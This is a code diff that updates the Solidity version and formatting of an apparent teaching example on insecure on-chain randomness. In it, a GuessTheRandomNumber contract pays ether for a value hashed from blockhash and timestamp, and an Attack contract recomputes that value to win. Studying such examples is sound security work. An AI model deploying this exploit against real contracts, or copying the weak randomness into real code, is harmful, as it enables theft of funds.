@@ -1,5 +1,5 @@
 // SPDX-License-Identifier: MIT
-pragma solidity ^0.7.6;
+pragma solidity ^0.8.3;
 
 /*
 NOTE: cannot use blockhash in Remix so use ganache-cli
@@ -28,10 +28,9 @@ contract GuessTheRandomNumber {
     constructor() payable {}
 
     function guess(uint _guess) public {
-        uint answer = uint(keccak256(abi.encodePacked(
-            blockhash(block.number - 1),
-            block.timestamp
-        )));
+        uint answer = uint(
+            keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))
+        );
 
         if (_guess == answer) {
             (bool sent, ) = msg.sender.call{value: 1 ether}("");
@@ -44,10 +43,9 @@ contract Attack {
     receive() external payable {}
 
     function attack(GuessTheRandomNumber guessTheRandomNumber) public {
-         uint answer = uint(keccak256(abi.encodePacked(
-            blockhash(block.number - 1),
-            block.timestamp
-        )));
+        uint answer = uint(
+            keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))
+        );
 
         guessTheRandomNumber.guess(answer);
     }
